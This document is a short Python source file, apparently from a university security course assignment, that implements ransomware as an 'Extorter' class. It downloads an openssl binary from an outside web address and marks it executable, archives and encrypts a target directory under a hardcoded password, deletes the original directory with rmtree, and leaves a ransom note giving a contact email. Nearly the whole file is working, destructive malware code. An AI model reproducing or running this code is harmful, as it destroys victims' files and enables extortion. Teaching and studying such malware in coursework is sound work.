import urllib.request
import tarfile
import shutil

# Import the necessary files
from subprocess import call

class Extorter(object):

	OPENSSL_LOCATION = 'openssl'
	TARFILE_LOCATION = 'all-your-ish.tar'

	password = None
	targetDirectory = None
	maliciousNote = None

	def __init__(self, target, maliciousNoteLocation):
		self.password = 'cs456worm'
		self.targetDirectory = target
		self.maliciousNote = maliciousNoteLocation

	@staticmethod
	def download(url, path):
		urllib.request.urlretrieve(url, path)

	def execute(self):

		# Download the openssl executable
		Extorter.download('http://ecs.fullerton.edu/∼mgofman/openssl', Extorter.OPENSSL_LOCATION)

		# Archive all of their stuff
		self.archiveAllTheThings()

		# Encrypt it
		self.encrypt()

		# Erase their home directory
		self.eraseDirectory()

		# Leave them a nice note
		self.leaveNote()

	def archiveAllTheThings(self):
		# Open the specified archive file (e.g. exdir.tar).
		# If the archive does not already exit, create it.
		tar = tarfile.open(Extorter.TARFILE_LOCATION, "w:gz")

		# Add the exdir/ directory to the archive
		tar.add(self.targetDirectory)

		# Close the archive file
		tar.close()

	def encrypt(self):
		# The following is an example which makes
		# program openssl executable once you download
		# it from the web. The code that follows is
		# equivalent to running chmod a+x openssl
		# from the shell command line.
		# The format is <command name>, <ARG1>, <ARG2>,
		# ..., <ARGN> where each ARGi is an argument.
		call(["chmod", "a+x", "./" + Extorter.OPENSSL_LOCATION])

		# The code below is equivalent to running line:
		# openssl aes-256-cbc -a -salt -in secrets.txt -out secrets.txt.enc
		# from the shell prompt.
		# You do not need to understand the details of how
		# this program works. Basically, "runprog.py" is the
		# input file to the program which we would like to
		# encrypt, "runprog.py.enc" is the output file
		# containing encrypted contents of file
		# "runprog.py.enc" and "pass" is the password.
		call(["./" + Extorter.OPENSSL_LOCATION, "aes-256-cbc", "-a", "-salt", "-in", Extorter.TARFILE_LOCATION, "-out", Extorter.TARFILE_LOCATION + ".enc", "-k", self.password])

	def eraseDirectory(self):
		shutil.rmtree(self.targetDirectory)

	def leaveNote(self):
		f = open("~/Want-your-stuff-back?.txt", 'a') # Need some kind of path manipulation
		f.write('"Your documents directory has been hijacked. Contact me at pwned@gmail.com for the password.')
		f.close()